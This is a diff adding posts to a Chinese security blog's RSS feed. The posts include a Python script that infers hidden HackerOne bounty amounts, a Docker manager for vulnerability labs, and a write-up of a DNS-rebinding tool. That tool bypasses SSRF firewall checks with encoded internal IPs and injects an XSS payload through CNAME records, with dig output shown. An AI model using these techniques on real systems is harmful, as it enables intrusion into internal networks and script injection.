@@ -8,6 +8,26 @@
 
 <item>
 <title>Symbo1</title>
+<description>&lt;h1 id=&quot;symbo1&quot;&gt;Symbo1&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;01 Dec 2018 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      和师傅们组了个局儿 —— &lt;a href=&quot;https://www.Symbo1.com/&quot; target=&quot;_blank&quot;&gt;www.Symbo1.com&lt;/a&gt;截止上线为止团队成员收割了44家国际厂商的Acknowledgement。就像About里的那句话：Reward只是一时的，每个Acknowledgement才是永恒的。个人来讲有无Reward无所谓，譬如Apple、Evernote等我都会玩。不过下文还是会站在整个BugHunter中立角度来简单阐述下国际厂商的一些事。&lt;/p&gt;
+
+&lt;p&gt;      印象中第一次给国际厂商提交报告还是几年前，通过h1报给PHP(IBB)的，不过以内部已知忽略告终。随后慢慢接触发现挖国际厂商还是挺有意思的，会接触很多新鲜事物：老外架构的软件或部署的系统以及针对漏洞的审核。并不是说挖国际厂商多么难，（gg tt fb这种是挺难的）而是刚开始我们并不了解歪果仁每天都在使用的产品。就好比再厉害的外国选手，耍国内src未必拼的过我国学生。&lt;/p&gt;
+
+&lt;p&gt;      话说回来，还是会有一些优秀的Bughunter值得学习，他们的想法与思路真的很新奇，与国内的视角是不一样的，而且审核针对每个漏洞的评判也并不一致。他们更看重一个漏洞危害程度，譬如domain takeover这种漏洞uber、starbucks能Reward$5000（挖到的前提是讲究天时地利柔人和，我是没捡到过）国内很少见，和本土云服务有关吧。还是这个例子，原理的确很简单粗暴，但放在国内就会说只是domain master点错了给您“打一折”儿吧小老弟。&lt;/p&gt;
+
+&lt;p&gt;      玩国际厂商还是放弃一把梭吧，扫描器之类的更没什么用。印象中h1 leaderboard（同登过某季度的xD）有个毛子选手那真的猛的一批，所以国外项目个人更倾向于更大范围的信息收集，7*24小时轮训几百个项目主域名的子域名+设备服务指纹信息等，甚至自制域段翻个遍。再采集下来，检索关键字挑能看对眼的玩。&lt;/p&gt;
+
+&lt;p&gt;      前面存在一部分玩笑，其实国内src发展的蛮好的，也算是良性的体系，不能说哪个优秀的国际厂商值得我们借鉴，而是整体可以互相学习的。甚至本土也有越来越多的厂商入驻国外BugHunter圈子，金山、滴滴、阿里等。but老外们要是想挖国内src估计会卡在注册时没有+86的11位手机号而不得不放弃精美的积分玩偶，用来见证这份跨越种族的黑客友谊。&lt;/p&gt;
+
+&lt;p&gt;      我爱我的祖国，国际VRP项目Reward无所谓，甚至你修不修我都无所谓。只需要记住是为自身生长就够了，尽人事听天命。&lt;/p&gt;
+
+&lt;p&gt;      时间往前倒退，怀念也欣慰最初和童哥、帅帅、滨师傅等人交流国际项目的日子，才会有今天的组织成立。一首&lt;a href=&quot;http://music.163.com/#/m/song?id=19542337&quot; target=&quot;_blank&quot;&gt;Hall of Fame&lt;/a&gt;送给你们。&lt;/p&gt;
+
+&lt;p&gt;      客观原因也的确有些日子没有和师傅们研究这些项目了，未来我们就算不挖还是会多做些相关研究，并通过团队输出更多的价值。&lt;/p&gt;
+
+</description>
 <pubDate>Sat, 01 Dec 2018 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2018/12/01/symbo1.html</link>
 <guid isPermaLink="true">http://localhost:4000/2018/12/01/symbo1.html</guid>
@@ -15,6 +35,144 @@
 
 <item>
 <title>Cracked HackerOne Hidden Bounty Amount</title>
+<description>&lt;h1 id=&quot;cracked-hackerone-hidden-bounty-amount&quot;&gt;Cracked HackerOne Hidden Bounty Amount&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;16 May 2018 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;      这个是我前几天提给HackerOne官方并被确认的Violation of Secure Design Principles类型报告。推算隐藏的奖金，可惜计算方式是正态分布，画出范围不能精确，for fun。详情懒得再写一遍了，可以从我的POC中看出逻辑;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+#coding:utf-8
+
+import json
+import requests
+from datetime import datetime
+
+
+class crack(object):
+	def __init__(self, user):
+		self.teams = {}
+		self.user = user
+		self.formatted_bounty = {
+			&quot;$&quot;:[&quot;BOUNTY_LOW&quot;,&quot;base_bounty&quot;,&quot;&amp;lt;&quot;],
+			&quot;$$&quot;:[&quot;BOUNTY_MEDIUM&quot;,&quot;base_bounty&quot;, &quot;&amp;gt;=&quot;],
+			&quot;$$$&quot;:[&quot;BOUNTY_HIGH&quot;,&quot;top_bounty_lower_range&quot;, &quot;&amp;gt;=&quot;],
+			&quot;$$$$&quot;:[&quot;BOUNTY_SEVERE&quot;,&quot;top_bounty_lower_range&quot;, &quot;&amp;gt;=&quot;]
+		}
+		self.headers = {
+			'accept': 'application/json',
+			'x-requested-with': 'XMLHttpRequest',
+		}
+
+
+	def loads_hide_reward(self):
+		print &quot;[+] Loads Hidden Bounty Reports ...&quot;
+		url = 'https://hackerone.com/hacktivity?sort_type=latest_disclosable_activity_at&amp;amp;page={}&amp;amp;filter=type%3Abounty-awarded%20{}&amp;amp;range=forever'
+		req = json.loads(requests.get(url.format(1, self.user), headers=self.headers).content)
+		bounty_reports = req['reports']
+		if req['pages'] &amp;gt; 1:
+			print &quot;[+] There are {} pages&quot;.format(req['pages'])
+			for i in range(1,req['pages'] + 1):
+				bounty_reports += json.loads(requests.get(url.format(i, self.user), headers=self.headers).content)['reports']
+
+		hide_bounty_reports = filter(lambda x:x['bounty_disclosed'] == False, bounty_reports)
+		if len(hide_bounty_reports) == 0:
+			print &quot;[+] Hide Bounty Reports Count 0!&quot;
+			exit()
+
+		results = {}
+		for k,p in enumerate(hide_bounty_reports):
+			report_tmp = {}
+			report_tmp['id'] = p['id']
+			report_tmp['team'] = p['team']['handle']
+			report_tmp['from_or_to'] = report_tmp['team'] if 'from%3A' in self.user else p['reporter']['username']
+			report_tmp['bounty'] = p['formatted_bounty']
+			time_format = datetime.strptime(p['latest_disclosable_activity_at'], &quot;%Y-%m-%dT%H:%M:%S.%fZ&quot;).strftime(&quot;%Y/%m/%d %H:%M:%S&quot;)
+			report_tmp['hacktivity'] = p['latest_disclosable_action'] + &quot; &quot; + time_format
+			results[k] = report_tmp
+			print &quot;[{}] -&amp;gt; {} {} {} {}&quot;.format(k, 
+											report_tmp['id'], 
+											report_tmp['from_or_to'], 
+											report_tmp['bounty'], 
+											report_tmp['hacktivity']
+											)
+
+		report_key = raw_input(&quot;Select Bounty Hidden Report [Default ALL]:&quot;)
+		if report_key.isdigit() and 0 &amp;lt;= int(report_key) &amp;lt;= len(results) - 1:
+			report_keys = [int(report_key)]
+		else:
+			report_keys = range(len(results))
+
+		for i in report_keys:
+			res_tmp = results[i]
+			team = res_tmp['team']
+			if team not in self.teams: self.teams[team] = self.loads_team(team)
+			bounty_dict = self.formatted_bounty[res_tmp['bounty']]
+			team_base_bounty = self.teams[team]['base_bounty']
+			team_top_bounty = self.teams[team]['top_bounty_lower_range']
+
+			if team_base_bounty == None and team_top_bounty and res_tmp['bounty'] in [&quot;$&quot;,&quot;$$&quot;]:
+				math_flag = &quot;&amp;lt;&quot;
+				bounty = self.teams[team]['top_bounty_lower_range']
+
+			elif team_base_bounty and team_top_bounty == None:
+				bounty = team_base_bounty
+				math_flag = bounty_dict[2] if res_tmp['bounty'] in [&quot;$&quot;,&quot;$$&quot;] else &quot;&amp;gt;&quot;
+
+			elif team_base_bounty and team_top_bounty and res_tmp['bounty'] == &quot;$$&quot;:
+				print &quot;\033[15;32m[{}:{}] ${} &amp;gt; Bounty &amp;gt;= ${}\033[0m&quot;.format(i, bounty_dict[0], team_top_bounty, team_base_bounty)
+				continue
+
+			elif not filter(lambda x:x != None, [team_base_bounty, team_top_bounty]):
+				print &quot;\033[15;33m[{}] {} Team not show the Amount of Bounty, please read https://hackerone.com/{} page find this\033[0m&quot;.format(i,team,team)
+				math_flag = &quot;&amp;gt;&quot;
+				bounty = 0
+
+			else:
+				math_flag = bounty_dict[2]
+				bounty = self.teams[team][bounty_dict[1]]
+
+			print &quot;\033[15;32m[{}:{}] Bounty {} ${}\033[0m&quot;.format(i, bounty_dict[0], math_flag, bounty)
+
+
+	def loads_team(self, team):
+		print &quot;[+] Analysis {} Team Information ...&quot;.format(team)
+		team_base = json.loads(requests.get('https://hackerone.com/{}'.format(team), headers=self.headers).content)
+		team_metrics = json.loads(requests.get('https://hackerone.com/{}/profile_metrics.json'.format(team), headers=self.headers).content)
+		team_rule = {}
+		team_rule['base_bounty'] = team_base['base_bounty'] if 'base_bounty' in team_base.keys() else None
+		team_rule['top_bounty_lower_range'] = team_metrics['top_bounty_lower_range']
+
+		return team_rule
+
+
+if __name__ == '__main__':
+	crack_type = raw_input(&quot;please Input Crack Type[0:hack {default}/1:team]&quot;)
+	if crack_type.isdigit() and int(crack_type) == 1:
+		user = &quot;to%3A&quot; + raw_input(&quot;please Input Team Names has Handle:&quot;)
+	else:
+		user = &quot;from%3A&quot; + raw_input(&quot;please Input HackerOne Id:&quot;)
+	crack(user).loads_hide_reward()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;计算@&lt;a target=&quot;_blank&quot; href=&quot;https://hackerone.com/geekboy&quot;&gt;geekboy&lt;/a&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/579xovyz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/575csqpv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;计算@&lt;a target=&quot;_blank&quot; href=&quot;https://hackerone.com/quora&quot;&gt;quora&lt;/a&gt;厂商:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/378eahxk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/21uemnb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
 <pubDate>Wed, 16 May 2018 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2018/05/16/cracked-h1-hidden-bounty-amount.html</link>
 <guid isPermaLink="true">http://localhost:4000/2018/05/16/cracked-h1-hidden-bounty-amount.html</guid>
@@ -22,6 +180,20 @@
 
 <item>
 <title>不为谁而作的文</title>
+<description>&lt;h1 id=&quot;不为谁而作的文&quot;&gt;不为谁而作的文&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;27 Sep 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;早上看到一哥们坐在医院路边痛哭，走过去看到CT片在他旁边，由于CT片的包装是半透明，隐隐约约能看出拍的是脑CT。递给了他根烟，只能帮你到这儿了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/95%5BR%2556B%5D%2518~BF8AR%7D5$KF.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;除了死亡其他都是小事。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+</description>
 <pubDate>Wed, 27 Sep 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/09/27/alive.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/09/27/alive.html</guid>
@@ -29,6 +201,100 @@
 
 <item>
 <title>MetaDockers</title>
+<description>&lt;h1 id=&quot;metadockers&quot;&gt;MetaDockers&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;17 Sep 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Vulhub Team做为以收集/制作docker漏洞靶场为基础，并发展Docker相关的开发，MetaDockers用于管理vulhub以及自实现的Docker可视化。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Tr3jer/dnsAutoRebinding&quot;&gt;vulhub&lt;/a&gt; - Docker-Compose file for vulnerability environment.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Tr3jer/dnsAutoRebinding&quot;&gt;MetaDockers&lt;/a&gt; - Responsible for visualization the vulhub or docker.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;setting&quot;&gt;setting：&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;配置vulhub path和docker api开关，docker若启动且加入环境变量那么默认即可docker.from_env()：
+MetaDockers/controller/lib/config.conf&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;sudo pip install -r requirements.txt&lt;/p&gt;
+
+&lt;p&gt;cd MetaDockers/&lt;/p&gt;
+
+&lt;p&gt;python manage.py runserver 8000&lt;/p&gt;
+
+&lt;h2 id=&quot;index&quot;&gt;Index:&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/gerggf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;vulhubs&quot;&gt;Vulhubs:&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;这个启动项没写，后期会直接拆分docker-compose包融合进去，还有各个靶场的README未分配。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/dsfwqe221.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;images&quot;&gt;Images:&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/regregeh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;还有这个images的启动参数有50多个。。。挨个测试心态炸了，好心人可以按&lt;a href=&quot;http://docker-py.readthedocs.io/en/stable/containers.html&quot;&gt;api文档&lt;/a&gt;加下哈哈（涉及controller/lib/dockerOperation.py的image_operation函数和templates/images.html的$(“.btn-run”).click），没人的话有空我也会加上：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3rvyjar.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;networks&quot;&gt;Networks:&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/43tyo8dsf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;可增加删除Networks：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/thth.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/ewtewr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;volumes&quot;&gt;Volumes:&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/32r32r3r2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;可增加删除volumes：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/rwiubsdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;containers&quot;&gt;Containers:&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;这个Containers才是重点，解决了在使用Container时的几个常见问题，比如因child导致kill不掉等。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/dsfwwefrew4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;正经的功能都有，还可直接跳转到映射的端口地址，其他功能可以摸索下：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/sadbkyuasd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;该Container的Log：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/wg7vyksdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;该Container的Info：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3qrg7iqw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;docker-info&quot;&gt;Docker Info:&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;层叠太多了，直接用的json view，浏览器ctrl+f吧2333.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3rb78sdfk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
 <pubDate>Sun, 17 Sep 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/09/17/metadockers.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/09/17/metadockers.html</guid>
@@ -36,6 +302,281 @@
 
 <item>
 <title>Dns Auto Rebinding</title>
+<description>&lt;h1 id=&quot;dns-auto-rebinding&quot;&gt;Dns Auto Rebinding&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;25 Jun 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      ssrf时难免会被防火墙拦截恶意返回值，使用过xip.io但效果一般。项目地址：
+&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Tr3jer/dnsAutoRebinding&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;      ssrf、ssrf内网地址fuzz、dns二次rebinding、支持ipv4/ipv6、支持ip地址转换码、dns记录污染(文末一个0day为例)。脑图在脑子里，懒得画了。&lt;/p&gt;
+
+&lt;p&gt;support Record Type and Encoding：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;MX = ipv4/ipv6/hex
+A = ipv4/en/int/hex
+AAAA = ipv6/int/hex
+CNAME = ipv4/ipv6/hex
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;配置监听服务器example.com：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;record type&lt;/th&gt;
+      &lt;th&gt;record&lt;/th&gt;
+      &lt;th&gt;record value&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;A&lt;/td&gt;
+      &lt;td&gt;ns&lt;/td&gt;
+      &lt;td&gt;server ip&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;NS&lt;/td&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;ns.example.com&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;sudo pip install ipaddr&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;修改lib/config.conf：
+maindomain = test.example.com.
+注意根地址.要加&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Usage: sudo python main.py {Options}
+
+Options:
+  -h, --help            show this help message and exit
+  -t 300, --TTL=300     ttl value , 0 By Default
+  -y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX
+                        Record Type , A By Default
+  -e int/hex/en, --Encoding=int/hex/en
+                        Record Encoding , None By Default
+  -r, --Rebinding       The Second Time Query Return Target Ip
+  -p &quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&quot;, --payload=&quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&quot;
+                        Specified Record , Support CNAME/MX
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;-y选项指定以什么记录类型返回：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;-y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX Record Type , A By Default&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;-t选项指定TTL值：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;-t 300, --TTL=300     ttl value , 0 By Default&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;直接A记录返回ipv4地址：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;sudo ./main.py&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig 192.168.1.1.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 50359
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		227	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;server:
+&lt;code&gt;[21:54:16] client ip:44486 =&amp;gt; A =&amp;gt; 192.168.1.1.test.example.com.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;hex编码：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;sudo ./main.py -e hex&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig 31302e302e302e31.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 31302e302e302e31.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 1585
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;31302e302e302e31.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+31302e302e302e31.test.example.com. 0 IN	A	10.0.0.1
+
+;; AUTHORITY SECTION:
+test.example.com.		600	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;server:
+&lt;code&gt;[22:00:42] client ip:30150 =&amp;gt; A =&amp;gt; 31302e302e302e31.test.example.com.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;int编码：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;sudo ./main.py -e int&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig 3232235777.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 3232235777.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 18066
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;3232235777.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+3232235777.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		456	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;server:
+&lt;code&gt;[22:03:00] client ip:5240 =&amp;gt; A =&amp;gt; 3232235777.test.example.com.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;      因为waf会识别出内网地址才用的上本项目，那么waf大可识别进制转换这种，所以要自己写个地址转换方法：&lt;/p&gt;
+
+&lt;p&gt;num to en:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;./lib/common.py 192.168.1.1
+
+1. Single IP Covert For En
+2. Build IP List
+[+] [1 By Default/2]
+bjckbgikbkb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;sudo ./main.py -e en&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig bjckbgikbkb.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; bjckbgikbkb.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 5115
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;bjckbgikbkb.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+bjckbgikbkb.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		20	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;server:
+&lt;code&gt;[22:10:22] client ip:8434 =&amp;gt; A =&amp;gt; bjckbgikbkb.test.example.com.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;dns二次rebinding:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo ./main.py -r
+Input Safe Ip? [Address/Req By Default]8.8.8.8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;      选择性输入目标信任的地址，比如在ssrf时防火墙在验证dns返回值是否存在于白名单。默认为发起请求的地址。(记得特殊情况需要指定记录类型)&lt;/p&gt;
+
+&lt;p&gt;第一次：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig 192.168.1.1.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 59544
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	8.8.8.8
+
+;; AUTHORITY SECTION:
+test.example.com.		461	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第二次：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig 192.168.1.1.test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 192.168.1.1.test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 45312
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;192.168.1.1.test.example.com.	IN	A
+
+;; ANSWER SECTION:
+192.168.1.1.test.example.com. 0	IN	A	192.168.1.1
+
+;; AUTHORITY SECTION:
+test.example.com.		501	IN	NS	ns.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;dns记录污染：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;sudo ./main.py -p &quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&quot; -y CNAME&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~ dig test.example.com
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; test.example.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 5073
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;test.example.com.			IN	A
+
+;; ANSWER SECTION:
+test.example.com.		0	IN	CNAME	&amp;lt;script&amp;gt;alert\(/xss/\)&amp;lt;/script&amp;gt;test.example.com.
+&lt;/code&gt;&lt;/pre&gt;
+
